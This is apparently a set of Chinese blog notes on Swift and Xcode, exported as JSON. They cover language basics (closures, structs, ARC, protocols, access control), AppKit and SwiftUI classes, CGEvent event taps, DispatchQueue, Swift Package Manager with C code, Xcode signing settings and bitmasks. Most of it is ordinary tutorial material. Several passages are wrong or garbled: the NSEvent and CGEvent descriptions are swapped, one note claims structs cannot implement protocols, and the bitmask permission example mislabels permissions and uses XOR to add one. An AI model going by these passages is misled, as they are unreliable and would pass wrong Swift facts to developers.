removeValueForKey() 方法来移除字典 key-value 对 如果 key 存在该方法返回移除的值，如果不存在返回 nil 遍历字典 我们可以使用 for-in 循环来遍历某个字典中的键值对: import Cocoa var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] for (key, value) in someDict { print(\"字典 key \\(key) - 字典 value \\(value)\") } 字典转换为数组 可以提取字典的键值(key-value)对，并转换为独立的数组: import Cocoa var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] let dictKeys = [Int](someDict.keys) let dictValues = [String](someDict.values) count 属性 可以使用只读的 count 属性来计算字典有多少个键值对 isEmpty 属性 可以通过只读属性 isEmpty 来判断字典是否为空 Swift 函数 函数定义: func funcname(形参) -> returntype { Statement1 Statement2 …… Statement N return parameters } 可变参数 可变参数可以接受零个或多个值. 通过在变量类型名后面加入（...）的方式来定义 常量，变量及 I/O 参数 一般默认在函数中定义的参数都是常量参数，也就是这个参数你只可以查询使用，不能改变它的值。 如果想要声明一个变量参数，可以在参数定义前加 inout 关键字，这样就可以改变这个参数的值了 例如: func getName(_ name: inout String)......... 一般默认的参数传递都是传值调用的，而不是传引用。所以传入的参数在函数内改变，并不影响原来的那个参数。传入的只是这个参数的副本。 当传入的参数作为输入输出参数时，需要在参数名前加 & 符，表示这个值可以被函数修改。 实例: import Cocoa func swapTwoInts(_ a: inout Int, _ b: inout Int) { let temporaryA = a a = b b = temporaryA } var x = 1 var y = 5 swapTwoInts(&x, &y) print(\"x 现在的值 \\(x), y 现在的值 \\(y)\") 使用函数类型 可以定义一个类型为函数的常量或变量，并将适当的函数赋值给它: var addition: (Int, Int) -> Int = sum Swift 闭包 闭包(Closures)是自包含的功能代码块，可以在代码中使用或者用来作为参数传值。 Swift 中的闭包与 C 和 Objective-C 中的代码块（blocks）以及其他一些编程语言中的 匿名函数比较相似。 全局函数和嵌套函数其实就是特殊的闭包 大多数情况下, Swift的闭包相当于匿名函数, 比如: let driver = { print(\"is driver\") } 调用: driver 但是这并不意味着不能使用参数, 需要的参数是被写在花括号里面的 : 为了让一个闭包接收参数， 需要在 花括号之后把这些参数列出来，然后跟上一个 in 关键字 。 这样就告诉Swift，闭包的主体是从哪里开始的: let driver = { (place: String) in print(\"is driver in \\(place)\") } 函数和闭包的一个区别是运行闭包的时候你不会用到参数标签, 直接调用即可: driver(\"秋名山\") 若需要指定返回值: let driver = { (place: String) -> String in return \"is driver in \\(place)\" } 拖尾闭包语法 如果一个函数的最后一个参数是闭包， Swift允许你采用一种被称为 \"拖尾闭包语法\" 的方式来调用这个闭包。 你可以把闭包传入函数之后的花括号里，而不必像传入参数那样。 以下为例: func travel(action: () -> Void) { print(\"我准备开车了。\") action() print(\"我已抵达。\") } 正常一般会这样调用: travel(action: driver) 由于函数的最后一个参数是闭包，我们可以用拖尾闭包语法来调用 上一节的driver: travel() { print(\"is driver\") } 或者: travel() { print(\"is driver\") } 实际上，由于函数没有别的参数了，我们还可以将圆括号完全移除: travel { print(\"is driver\") } 若要接受参数: func travel(action: (String) -> Void) ... 若需要带返回值: travel { (place: String) -> String in return \"is driver in \\(place)\" } 若知道place与返回类型, 可以去掉注解, 同时因为主体只有一行代码, 所以return也可以去掉, 即: travel { place in \"is driver in \\(place)\" } Swift还提供一种速记语法，让你可以把代码变得更短。 我们可以让Swift为闭包的参数自动提供一个名字，而不必自行写下 place in。 这些自动生成的名字以$开头，然后跟着一个从0开始的整数，就像下面这样: travel { \"is driver in \\($0)。\" } Swift 枚举 枚举简单的说也是一种数据类型，只不过是这种数据类型只包含自定义的特定数据，它是一组有共同特性的数据的集合。 Swift 的枚举类似于 Objective C 和 C 的结构，枚举的功能为: 它声明在类中，可以通过实例化类来访问它的值。 枚举也可以定义构造函数（initializers）来提供一个初始成员值；可以在原始的实现基础上扩展它们的功能。 可以遵守协议（protocols）来提供标准的功能。 定义: enum enumname { // 枚举定义放在这里 case 变量 } case关键词表示一行新的成员值将被定义。 重要 和 C 和 Objective-C 不同，Swift 的枚举成员在被创建时不会被赋予一个默认的整型值 Swift 结构体 Swift 结构体是构建代码所用的一种通用且灵活的构造体。 我们可以为结构体定义属性（常量、变量）和添加方法，从而扩展结构体的功能。 与 C 和 Objective C 不同的是： 结构体不需要包含实现文件和接口。 结构体允许我们创建一个单一文件，且系统会自动生成面向其它代码的外部接口。 结构体总是通过被复制的方式在代码中传递，因此它的值是不可修改的。 值传递 通过关键字 struct 来定义结构体: struct nameStruct { Definition 1 Definition 2 …… Definition N } Swift 类 在一个单一文件中定义一个类，系统会自动生成面向其它代码的外部接口。 恒等运算符 判定两个常量或者变量是否引用同一个类实例，Swift 内建了两个恒等运算符 === : 两个常量或者变量引用同一个类实例则返回 true !== : 两个常量或者变量引用不同一个类实例则返回 true Swift 属性 存储属性 一个存储属性就是存储在特定类或结构体的实例里的一个常量或变量 延迟存储属性 当第一次被调用的时候才会计算其初始值的属性 在属性声明前使用 lazy 来标示一个延迟存储属性, 且必须声明为var变量 一般用于： 延迟对象的创建。 当属性的值依赖于其他未知类 计算属性 除存储属性外，类、结构体和枚举可以定义计算属性，计算属性不直接存储值， 而是提供一个 getter 来获取值，一个可选的 setter 来间接设置其他属性或变量的值。 只读计算属性 只有 getter 没有 setter 的计算属性就是只读计算属性 属性观察器 属性观察器监控和响应属性值的变化 不需要为无法重载的计算属性添加属性观察器，因为可以通过 setter 直接监控和响应值的变化。 可以为属性添加如下的一个或全部观察器： willSet在设置新的值之前调用 didSet在新的值被设置之后立即调用 willSet和didSet观察器在属性初始化过程中不会被调用 Swift 方法 self 属性 类型的每一个实例都有一个隐含属性叫做self，self 完全等同于该实例本身， 相当于Java的this 在实例方法中修改值类型 Swift 语言中结构体和枚举是值类型。一般情况下，值类型的属性不能在它的实例方法中被修改 若确实需要修改， 可以选择变异(mutating)这个方法，然后方法就可以从方法内部改变它的属性； 并且它做的任何改变在方法结束时还会保留在原始结构中。 方法还可以给它隐含的self属性赋值一个全新的实例，这个新实例在方法结束后将替换原来的实例 在可变方法中给 self 赋值 可变方法能够赋给隐含属性 self 一个全新的实例。 类型方法 就是类方法 Swift 下标 某些方面也可以理解为增加类似数组的功能 下标脚本允许你通过在实例后面的方括号中传入一个或者多个的索引值来对实例进行访问和赋值。 语法类似于实例方法和计算型属性的混合。 与定义实例方法类似，定义下标脚本使用subscript关键字，显式声明入参（一个或多个）和返回类型。 与实例方法不同的是下标脚本可以设定为读写或只读。这种方式又有点像计算型属性的getter和setter: subscript(index: Int) -> Int { get { // 用于下标脚本值的声明 } set(newValue) { // 执行赋值操作 } } 参考: https://www.runoob.com/swift/swift-subscripts.html 实例: import Cocoa struct subexample { let decrementer: Int subscript(index: Int) -> Int { return decrementer / index } } let division = subexample(decrementer: 100) print(\"100 除以 9 等于 \\(division[9])\") print(\"100 除以 2 等于 \\(division[2])\") print(\"100 除以 3 等于 \\(division[3])\") print(\"100 除以 5 等于 \\(division[5])\") print(\"100 除以 7 等于 \\(division[7])\") 用法 根据使用场景不同下标脚本也具有不同的含义。 通常下标脚本是用来访问集合（collection），列表（list）或序列（sequence）中元素的快捷方式。 你可以在你自己特定的类或结构体中自由的实现下标脚本来提供合适的功能。 Swift 继承 继承 使用冒号 重写（Overriding） 子类可以通过继承来的实例方法，类方法，实例属性， 或下标脚本来实现自己的定制功能，我们把这种行为叫重写（overriding）。 子类可以通过继承来的实例方法，类方法，实例属性，或下标脚本来实现自己的定制功能， 把这种行为叫重写（overriding）。 防止重写 使用 final 关键字防止它们被重写。 Swift 构造过程 构造函数使用 init() 方法 类实例也可以通过定义析构器（deinitializer）在类实例释放之前执行清理内存的工作。 存储型属性的初始赋值 类和结构体在实例创建时，必须为所有存储型属性设置合适的初始值。 存储属性在构造器中赋值时，它们的值是被直接设置的，不会触发任何属性观测器。 存储属性在构造器中赋值流程： 创建初始值。 在属性定义中指定默认属性值。 初始化实例，并调用 init() 方法。 构造过程中修改常量属性 只要在构造过程结束前常量的值能确定，你可以在构造过程中的任意时间点修改常量属性的值 对某个类实例来说，它的常量属性只能在定义它的类的构造过程中修改；不能在子类中修改。 默认构造器 默认构造器将简单的创建一个所有属性值都设置为默认值的实例: 结构体的逐一成员构造器 如果结构体对所有存储型属性提供了默认值且自身没有提供定制的构造器， 它们能自动获得一个逐一成员构造器 如: struct Rectangle { var length = 100.0, breadth = 200.0 } let area = Rectangle(length: 24.0, breadth: 32.0) print(\"矩形的面积: \\(area.length)\") print(\"矩形的面积: \\(area.breadth)\") 值类型的构造器代理 构造器可以通过调用其它构造器来完成实例的部分构造过程。 这一过程称为构造器代理，它能减少多个构造器间的代码重复。 构造器的继承和重载 Swift 中的子类不会默认继承父类的构造器。 父类的构造器仅在确定和安全的情况下被继承。 当你重写一个父类指定构造器时，你需要写override修饰符 可失败构造器 可以在一个类，结构体或是枚举类型的定义中，添加一个或多个可失败构造器。 其语法为在init关键字后面加添问号(init?)。 Swift 析构过程 在一个类的实例被释放之前，析构函数被立即调用。 用关键字deinit来标示析构函数，类似于初始化函数用init来标示。析构函数只适用于类类型。 Swift 可选链 参考: https://www.runoob.com/swift/swift-optional-chaining.html 调用时候使用问号/叹号， 问号表示可能为空， 为空则不继续调用 叹号表示强制调用（最好确定一定可以调用） 注解 这点与ts基本一致 Swift 自动引用计数（ARC） Swift 使用自动引用计数（ARC）这一机制来跟踪和管理应用程序的内存 通常情况下我们不需要去手动释放内存，因为 ARC 会在类的实例不再被使用时，自动释放其占用的内存。 但在有些时候我们还是需要在代码中实现内存管理。 ARC 功能 当每次使用 init() 方法创建一个类的新的实例的时候，ARC 会分配一大块内存用来储存实例的信息。 内存中会包含实例的类型信息，以及这个实例所有相关属性的值。 当实例不再被使用时，ARC 释放实例所占用的内存，并让释放的内存能挪作他用。 为了确保使用中的实例不会被销毁，ARC 会跟踪和计算每一个实例正在被多少属性，常量和变量所引用。 实例赋值给属性、常量或变量，它们都会创建此实例的强引用，只要强引用还在，实例是不允许被销毁的。 类实例之间的循环强引用 循环引用， 永远不会被回收 Swift 提供了两种办法用来解决你在使用类的属性时所遇到的循环强引用问题 弱引用: weak var 变量 无主引用: unowned let 变量 弱引用和无主引用允许循环引用中的一个实例引用另外一个实例而不保持强引用。 这样实例能够互相引用而不产生循环强引用。 对于生命周期中会变为nil的实例使用弱引用。 相反的，对于初始化赋值后再也不会被赋值为nil的实例，使用无主引用。 循环强引用还会发生在当你将一个闭包赋值给类实例的某个属性， 并且这个闭包体中又使用了实例 Swift 类型转换 Swift 语言类型转换可以判断实例的类型。也可以用于检测实例类型是否属于其父类或者子类的实例。 is: 检测值的类型 as: 转换类型 向下转型 向下转型，用类型转换操作符(as? 或 as!) 当你不确定向下转型可以成功时，用类型转换的条件形式(as?)。 条件形式的类型转换总是返回一个可选值（optional value）， 并且若下转是不可能的，可选值将是 nil。 只有你可以确定向下转型一定会成功时，才使用强制形式(as!)。 当你试图向下转型为一个不正确的类型时，强制形式的类型转换会触发一个运行时错误。 Any和AnyObject的类型转换 Swift为不确定类型提供了两种特殊类型别名： AnyObject可以代表任何class类型的实例。 Any可以表示任何类型，包括方法类型（function types）。 只有当你明确的需要它的行为和功能时才使用Any和AnyObject。 在你的代码里使用你期望的明确的类型总是更好的。 Swift 扩展 扩展就是向一个已有的类、结构体或枚举类型添加新功能。 扩展可以对一个类型添加新的功能，但是不能重写已有的功能。 语法 扩展声明使用关键字 extension: extension SomeType { // 加到SomeType的新功能写到这里 } 一个扩展可以扩展一个已有类型，使其能够适配一个或多个协议，语法格式如下: extension SomeType: SomeProtocol, AnotherProctocol { // 协议实现写到这里 } 下面的例子向 Int 类型添加了 5 个计算型实例属性并扩展其功能: extension Int { var add: Int {return self + 100 } var sub: Int { return self - 10 } var mul: Int { return self * 10 } var div: Int { return self / 5 } } let addition = 3.add print(\"加法运算后的值：\\(addition)\") Swift 协议 应该就是接口吧 协议的语法格式如下: protocol SomeProtocol { // 协议内容 } 要使类遵循某个协议，需要在类型名称后加上协议名称，中间以冒号:分隔. 遵循多个协议时，各协议之间用逗号,分隔: struct SomeStructure: FirstProtocol, AnotherProtocol { // 结构体内容 } 如果类在遵循协议的同时拥有父类，应该将父类名放在协议名之前，以逗号分隔: class SomeClass: SomeSuperClass, FirstProtocol, AnotherProtocol { // 类的内容 } 类专属协议 可以在协议的继承列表中,通过添加class关键字,限制协议只能适配到类（class）类型。 该class关键字必须是第一个出现在协议的继承列表中，其后，才是其他继承协议。格式如下: protocol SomeClassOnlyProtocol: class, SomeInheritedProtocol { // 协议定义 } Swift 泛型 类型约束 关联类 使用 associatedtype 关键字来设置关联类型实例 Where 语句 可以在参数列表中通过where语句定义参数的约束 Swift 访问控制 public 可以访问自己模块中源文件里的任何实体，别人也可以通过引入该模块来访问源文件里的所有实体。 internal 可以访问自己模块中源文件里的任何实体，但是别人不能访问该模块中源文件里的实体。 fileprivate 文件内私有，只能在当前源文件中使用。 private 只能在类中访问，离开了这个类或者结构体的作用域外面就无法访问。 枚举类型访问权限 枚举中成员的访问级别继承自该枚举，你不能为枚举中的成员单独申明不同的访问级别。 子类访问权限 子类的访问级别不得高于父类的访问级别。 比如说，父类的访问级别是 internal，子类的访问级别就不能申明为 public。","tags":"后端; swift","url":"/yq-backend-swift-course-lan.html","loc":"/yq-backend-swift-course-lan.html"},{"title":"官方库","text":"UIKit 移动端用 Cocoa OS x桌面端用 包含 AppKit: 官方文档: https://developer.apple.com/documentation/appkit Foundation SwiftUI 较新的框架, 跨平台支持(桌面/移动) 一些库对象/函数 NSEvent 是Core Graphics框架提供的事件处理类。 一个比较底层的事件类, 用于处理与图形渲染和窗口服务相关的事件。 CGEvent可以用于模拟和处理鼠标、键盘、触摸等低级输入事件。 它提供了更底层的控制，可以直接操作事件的属性，如位置、按键状态等。 CGEvent AppKit框架提供的事件处理类. 是一个较高层的事件处理接口，用于处理与应用程序界面和用户交互相关的事件。 NSEvent提供了一些高级的功能，如自动处理按键重复、多点触控、手势识别等。 它还提供了更高级的事件处理方法，如响应链、事件分发等。 CGEvent.tapCreate 创建一个事件截取, 参考: https://developer.apple.com/documentation/coregraphics/cgevent/1454426-tapcreate 参数列表: (tap: CGEventTapLocation, place: CGEventTapPlacement, options: CGEventTapOptions, eventsOfInterest: CGEventMask, callback: CGEventTapCallBack, userInfo: UnsafeMutableRawPointer?) -> CFMachPort? 主要说一下 eventsOfInterest: CGEventMask , 这个是一个位掩码集合, 标识截取的事件类型, 比如 CGEventMask(1 << NSEvent.EventType.keyDown.rawValue) , 多个事件用 | 整合. 左移一位表示转换为位掩码 其中有一个参数Callable是个回调函数, 用于处理事件 需要返回一个cgEvent的指针(), 函数签名为 CGEventRef (*)(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) (返回一个CGEventRef对象，即一个CGEvent类型的引用) 回调函数负责创建和返回CGEventRef对象，并控制对该对象的内存管理 回调返回的cgEvent有两个可用的修饰: passRetained：在回调函数中，如果你使用passRetained来返回CGEventRef对象，它表示你将内存管理权转移给调用方。 这意味着，调用方需要负责在适当的时候调用CFRelease来释放CGEventRef对象，以确保正确释放内存并避免内存泄漏。 这通常适用于你在回调函数中创建了一个新的CGEventRef对象，并希望调用方负责管理其生命周期。 例如，如果你在回调函数中使用CGEventCreateCopy函数创建了一个新的事件副本，并通过passRetained返回， 那么调用方需要负责在不再需要该事件时调用CFRelease来释放它。 passUnretained：在回调函数中，如果你使用passUnretained来返回CGEventRef对象，它表示你不会转移内存管理权给调用方。 这意味着，调用方不需要调用CFRelease释放CGEventRef对象，因为你保留了对该对象的所有权。 这通常适用于你在回调函数中返回了一个指向全局或静态变量的CGEventRef对象， 或者你从其他地方获取的对象，而不是在回调函数中创建的新对象。 例如，如果你在回调函数中返回一个全局变量中存储的事件对象，或者你通过传递指针参数获取一个事件对象， 然后使用passUnretained返回，那么调用方不需要调用CFRelease释放它。 综上所述，使用passRetained表示你将内存管理权转移给调用方，调用方需要负责释放对象。 而使用passUnretained表示你保留了内存管理权，调用方无需释放对象。 你应根据具体情况选择适当的内存管理方式，以确保正确处理内存生命周期。 (这部分来自AI) 注解 另外自己使用 CGEvent 时, 尽量不要去强转为 NSEvent: let nsEvent = NSEvent(cgEvent: cgEvent), 因为有时候在这转了后, 返回的cgEvent, 在底层调用可能会报错: Assertion failure in -[NSEvent _initWithCGEvent:eventRef:], NSEvent.m:1,846 ... com.apple.NSEventThread (7): EXC_BREAKPOINT (code=1, subcode=0x18307be7c) Assertion failure in -[NSEvent _initWithCGEvent:eventRef:], NSEvent.m:1,846 DispatchQueue 执行任务的调度队列, 支持异步执行 DispatchQueue 是一个用于执行任务的调度队列，它是在Grand Central Dispatch (GCD) 中提供的主要类之一。 GCD是一个用于并发执行任务的底层系统框架，它提供了一种简单而强大的方式来管理并发任务的执行。 DispatchQueue 可以将任务（代码块）安排到不同的队列中，并按照特定的调度方式进行执行。它提供了两种类型的队列： Serial Queue（串行队列）：每次只能执行一个任务，按照任务添加的顺序进行执行。后一个任务会等待前一个任务完成后才能开始执行。 Concurrent Queue（并发队列）：可以同时执行多个任务，并且任务的执行顺序可能不确定。 你可以使用 DispatchQueue 来执行以下类型的任务： 同步任务（Sync Tasks）：任务会在当前线程中同步执行，直到任务执行完毕后才会继续执行后续代码。 异步任务（Async Tasks）：任务会在后台线程中异步执行，不会阻塞当前线程的执行，可以继续执行后续代码。 以下是一个使用 DispatchQueue 的简单示例: let queue = DispatchQueue(label: \"com.example.queue\") // 异步任务 queue.async { // 在后台线程执行的任务 print(\"异步任务\") } // 同步任务 queue.sync { // 在当前线程执行的任务 print(\"同步任务\") } DispatchQueue 还提供了其他功能，如延迟执行任务、调度任务在特定时间或间隔后执行等。 它是在iOS、macOS、watchOS 和 tvOS 开发中进行异步和并发编程的重要工具之一。 比如延时执行也可以: // 延时执行任务 DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { // 2秒后执行的任务 print(\"延时执行的任务\") } NSViewRepresentable 一个协议，用于在SwiftUI中封装和使用Cocoa（macOS）中的NSView。 它允许开发者通过实现一些必要的方法来创建自定义的NSView，并将其嵌入到SwiftUI视图层级中。 通过遵循NSViewRepresentable协议， 你可以创建一个遵循NSViewRepresentable协议的自定义结构体或类，然后实现以下两个必要的方法： makeNSView(context:)：在这个方法中，你需要创建并返回一个NSView实例。这个方法会在视图第一次被创建时调用。 updateNSView(_:context:)：在这个方法中，你可以根据需要更新NSView的属性和内容。这个方法会在视图的状态发生变化时被调用。 通过实现这些方法，你可以在SwiftUI中使用自定义的NSView， 并在其中使用Cocoa（macOS）提供的各种功能和控件，以满足特定的需求。 View 视图顶级窗口, 注意, 没有提供默认的close方法, 因为官方觉得close不应该由View触发 可以通过以下代码获取到View所在窗体然后关闭: NSWindow(contentViewController: NSHostingController(rootView: self)) NSWindow AppKit的窗口管理 NSHostingController AppKit 中的类，用于在 macOS 应用程序中承载 SwiftUI 视图。 它是一个 AppKit 视图控制器，用于在 AppKit 应用程序中托管和管理 SwiftUI 视图。 通过将 SwiftUI 视图嵌入到 NSHostingController 中，可以在 AppKit 应用程序的视图层次结构中使用 SwiftUI 视图。 ZStack与VStack ZStack 一个3D的布局方式, 比如有三个图标, 后者会叠放在前者上 VStack 垂直布局方式, 比如有三个图标, 后者会垂直排列与前者 支持的块 Settings 块 用于定义应用程序的设置场景，它是一个视图构造器，用于自定义应用程序的设置界面。 通过在 Settings 块中添加视图来创建自定义的设置界面，以供用户配置和调整应用程序的各种选项。 WindowGroup 块 WindowGroup 块用于定义应用程序的主窗口场景。 在 WindowGroup 块中，你可以指定应用程序的主窗口的内容视图以及其他与窗口相关的属性。 Scene 块 Scene 块用于定义应用程序的场景，它可以包含一个或多个窗口组。 你可以在 Scene 块中定义应用程序的场景配置、窗口管理和生命周期处理。 NavigationView 块 NavigationView 块用于创建具有导航功能的视图层次结构。 在 NavigationView 块中，你可以使用 NavigationView 的修饰符和子视图来定义导航栏、导航链接以及其他与导航相关的界面元素。 Form 块 Form 块用于创建表单视图，用于显示和收集用户的输入。 在 Form 块中，你可以使用 Form 的修饰符和子视图来创建表单字段、分组和其他与表单相关的界面元素。 List 块 List 块用于创建可滚动的列表视图。 在 List 块中，你可以使用 List 的修饰符和子视图来定义列表项、分组和其他与列表相关的界面元素。 ForEach 块 ForEach 块用于在列表或视图中迭代和显示集合中的元素。 在 ForEach 块中，你可以使用 ForEach 的修饰符和子视图来定义每个元素的显示方式和交互行为。 SwiftUI 与 AppKit SwiftUI 和 AppKit 是 Apple 提供的两个不同的框架， 用于构建 macOS 应用程序的用户界面。它们在设计和开发理念上有一些区别。 声明性 UI：SwiftUI 是一个基于声明性 UI 的框架， 它使用简洁的代码和声明式的方式来描述用户界面。 你可以使用 SwiftUI 的各种视图和修饰符来构建用户界面， 并且它会自动处理视图状态和布局，以及与用户交互的响应。 而 AppKit 是一个基于命令式的 UI 框架，你需要编写更多的代码来手动管理视图的状态和布局。 跨平台支持：SwiftUI 是一个跨平台框架， 除了 macOS，它还可以用于构建 iOS、iPadOS、watchOS 和 tvOS 应用程序。 这意味着你可以使用相同的代码和技术来开发多个平台上的应用程序。 而 AppKit 是专门为 macOS 设计的框架，不支持其他平台。 响应式布局：SwiftUI 的布局系统是响应式的， 它使用了一种叫做 \"容器视图\" 的概念，可以自动适应不同的屏幕尺寸和设备方向。 这使得开发适应性更强的用户界面变得更加容易。 AppKit 的布局系统相对较为传统，需要手动处理不同的屏幕尺寸和设备方向。 预览功能：SwiftUI 提供了一个强大的预览功能，可以在开发过程中实时预览和调试用户界面。 你可以在 Xcode 中查看 SwiftUI 视图在不同设备上的外观，并即时查看代码更改的效果。 这对于迭代开发和快速调试非常有帮助。AppKit 并没有提供类似的预览功能。 尽管 SwiftUI 在设计上有一些新颖的概念和优势， 但在某些情况下，仍然需要使用 AppKit 来构建更复杂和定制化的 macOS 应用程序。 AppKit 拥有更多的功能和灵活性","tags":"后端; swift","url":"/yq-backend-swift-course-lib.html","loc":"/yq-backend-swift-course-lib.html"},{"title":"swift结构体与类的使用区别","text":"结构体: 值类型, 当你创建结构体的实例时，它会创建该结构的深拷贝; 即使将其赋值给其他变量, 也是创建一个值的拷贝 结构体的成员默认是不可变的（immutable），除非你明确地使用关键字mutating来标记 结构体不能继承自其他结构体或类，也不能实现协议（protocol）。 但是，你可以在结构体中定义一个名为init的函数来实现初始化逻辑。 类 引用类型, 当你创建类的实例时，它创建的是对类类型的引用(多个引用执行同一个值) 类的成员默认是可变的（mutable） 类可以继承自其他类或实现协议 使用场景 结构体：结构体通常用于表示简单的数据模型， 如几何形状或货币单位，其中重点是数据而不是行为。 结构体的行为通常通过函数和计算属性来定义。 类：类通常用于表示更复杂的概念， 如人类、动物或汽车等，其中重点是行为和状态。 类可以拥有实例方法和类方法，以及属性（可以是可变的或不可变的）。","tags":"后端; swift","url":"/yq-backend-swift-issuse-diff-with-class-struct.html","loc":"/yq-backend-swift-issuse-diff-with-class-struct.html"},{"title":"使用SPM(Swift Package Manager)","text":"Swift Package Manager (SPM) 注解 源于AI, 有空整理 如果你想在 Swift Package Manager (SPM) 中导入 C 代码，你可以按照以下步骤进行操作： 创建 Swift 包 在你的项目目录中，打开终端或命令提示符。 使用 cd 命令导航到你的项目目录。 运行以下命令创建一个新的 Swift 包: swift package init 或者直接在xcode创建 配置 Swift 包 在项目目录中，使用文本编辑器打开 Package.swift 文件。 在 Package.swift 文件中，配置 Swift 包的名称、目标和依赖项等信息。 在 targets 数组中，定义你的目标及其相关设置，例如模块名称、源文件路径等。 在 Swift 包中创建 C 源文件 在你的 Swift 包目录中，创建一个包含 C 代码的源文件，例如 YourPackage/Sources/YourPackage/CFile.c。 在 C 源文件中，编写你的 C 代码。 更新 Swift 包配置文件 在 Package.swift 文件中，将 C 源文件添加到 Swift 包的目标中。 修改 targets 数组中的目标配置，添加 C 源文件的路径: // Package.swift // ... targets: [ .target( name: \"YourPackage\", dependencies: [], cSettings: [ .headerSearchPath(\"YourPackage/Sources/YourPackage\"), .unsafeFlags([\"-Xclang\", \"-fmodule-map-file=YourPackage/Sources/YourPackage/module.modulemap\"]), ] ), // ... ], 创建模块映射文件 在 Swift 包目录中，创建一个名为 module.modulemap 的模块映射文件， 例如 YourPackage/Sources/YourPackage/module.modulemap。 在模块映射文件中，指定你的 C 源文件的导入方式: // module.modulemap module YourPackage [system] { header \"CFile.h\" export * } 导入 C 代码 在你的 Swift 代码中，使用 import 语句导入你的 Swift 包。 现在你可以在 Swift 代码中使用导入的模块和其中的 C 代码: // Swift 代码 import YourPackage // 使用导入的模块和其中的 C 代码 通过以上步骤，你可以使用 Swift Package Manager 导入和使用 C 代码。 确保在 Swift 包的配置文件中正确指定了 C 源文件的路径，并使用模块映射文件来定义导入方式。 请注意，使用 Swift Package Manager 导入 C 代码需要适当的配置和目录结构， 并且需要在模块映射文件中正确定义 C 源文件的导入方式。 确保你的 C 代码可以正确编译和链接，并在 Swift 代码中按照适当的方式使用。","tags":"后端; swift","url":"/yq-backend-swift-spm.html","loc":"/yq-backend-swift-spm.html"},{"title":"一些好用三方库","text":"KeyboardShortcuts 键盘事件处理库: https://swiftpackageindex.com/sindresorhus/KeyboardShortcuts 支持全局快捷键的监听, 完美支持MacOS的沙盒","tags":"后端; swift","url":"/yq-backend-swift-three-lib.html","loc":"/yq-backend-swift-three-lib.html"},{"title":"Xcode删除掉强制证书","text":"Xcode删除掉强制证书/删除掉强制团队验证 先关闭掉xcode项目, 然后用文本编辑器比如vscode打开 项目配置文件 xxx.xcodeproj , 全局搜索并更新为以下字段: # 这个这样改 CODE_SIGN_STYLE = Manual; # 这些直接删除也可 CODE_SIGN_IDENTITY = \"\" DEVELOPMENT_TEAM = \"\" PROVISIONING_PROFILE_SPECIFIER = \"\"; 原来的内容也贴一下做个参考: CODE_SIGN_STYLE = Automatic; # 最主要就是这个和TEAM CODE_SIGN_IDENTITY = \"Apple Development\"; DEVELOPMENT_TEAM = \"\"; PROVISIONING_PROFILE_SPECIFIER = \"\"; 注解 不要在xcode项目打开的时候改, 不然会修改失败(多半会被内存中的覆盖掉) 重新打开xcode, 在 Target 中看看对不对, 不对就按这样选择 以及在 build setting 中的 Signing 设置下 注解 顺便吐槽一句, xcode 太难用","tags":"后端; swift","url":"/yq-backend-swift-xode-conf-del-cert.html","loc":"/yq-backend-swift-xode-conf-del-cert.html"},{"title":"Xcode的Info配置","text":"配置位置 这里配置时, 会自动新建一个info.plist文件. 若这里没有相应的选项, 那么可点击任意条目的 + 进行新增, 如图: 下面介绍常见条目作用 Application is agent (UIElement): boolean 用来将应用程序设置为代理（agent）应用程序。 应用程序将以无窗口的形式运行，并且不会在 Dock 中显示应用程序图标。 通常用于实现后台任务、系统级别的服务或菜单栏应用程序等。 代理应用程序在后台运行，不会干扰用户的工作流程，但仍然可以提供某些功能或服务。 隐藏应用程序图标：设置应用程序为代理应用程序后，应用程序的图标将不会显示在 Dock 中，从而不会占用 Dock 的空间 无窗口运行：代理应用程序通常不需要显示窗口，因此它们以无窗口的形式运行，不会在屏幕上显示用户界面。 后台任务：代理应用程序可以在后台执行任务，例如监控系统事件、定时任务、网络请求等。 系统级别的服务：代理应用程序可以提供系统级别的服务，例如全局快捷键监听、剪贴板操作、菜单栏扩展等。 额外作用: 窗口默认支持 显示在其他全屏应用上方 (可能是因为属于系统级)","tags":"后端; swift","url":"/yq-backend-swift-xode-conf-info.html","loc":"/yq-backend-swift-xode-conf-info.html"},{"title":"xcode15新功能","text":"预览宏-Preview 新版本如果要预览 swiftUI, 直接: #Preview { ContentView() } 即可 参考: https://juejin.cn/post/7244109491897401381","tags":"后端; swift","url":"/yq-backend-swift-xode-new-f.html","loc":"/yq-backend-swift-xode-new-f.html"},{"title":"Xcode-分发打包","text":"Xcode版本: 15.1(15C65) 当前版本 在此位置编辑Schema 或者在 Product - Schema 编辑Schema Product - Archive 进行打包 打包位置 然后会进入 Archive 界面, 选择 Distribute App 注意, Archive 界面也可以通过 Window - Organizer 进入: 没购买官方开发者账号的就选 Custom 来导出副本到本地 正规App开发者账号上传后续可以参考: https://zhuanlan.zhihu.com/p/583812511","tags":"后端; swift","url":"/yq-backend-swift-xode-pack-dist.html","loc":"/yq-backend-swift-xode-pack-dist.html"},{"title":"关于位掩码","text":"位掩码（BitMask），是\"位（Bit）\"和\"掩码（Mask）\"的组合词。 \"位\"指代着二进制数据当中的二进制位， 而\"掩码\"指的是一串用于与目标数据进行按位操作的二进制数字。 组合起来，就是\"用一串二进制数字（掩码）去操作另一串二进制数字\"的意思。 一般将1左移多少位表示位掩码来进行位运算, 解决当数量多时, 判断的复杂度高的问题 注解 1 << 0 表示 1左移0位 , 而不是 0左移1位 常见于权限分配 比如一个系统有四个权限位: delete = 0 read = 1 update = 2 create = 3 但是如果用位掩码(mask = 0b1)来查询是否有update权限: delete = 1 << 0 // 0000 0001 read = 1 << 1 // 0000 0010 update = 1 << 2 // 0000 0100 create = 1 << 3 // 0000 1000 如果用户的只有读权限 update, 直接bool判断: 1 << 1 & 1 << 2 // false, 0000 0010 & 0000 0100 如果要加 update , 使用异或: 1 << 1 &#94; 1 << 2 // 0000 0010 &#94; 0000 0100 = 0000 0110 如果 进制表示前缀 二进制前缀: 0b 经典问题-3只老鼠找8瓶水毒 有一个很经典的算法题，说是有1000个一模一样的瓶子， 其中有999瓶是普通的水，有一瓶是毒药。 任何喝下毒药的生物都会在一星期之后死亡。 现在，你只有10只小白鼠和一星期的时间，如何检验出哪个瓶子里有毒药？ 如果按照常规的解法是不是很繁琐，我们不妨思考一下用二进制来处理。 具体实现跟 3个老鼠确定8个瓶子 原理一样: 000=0 001=1 010=2 011=3 100=4 101=5 110=6 111=7 一位表示一个老鼠，0-7表示8个瓶子。 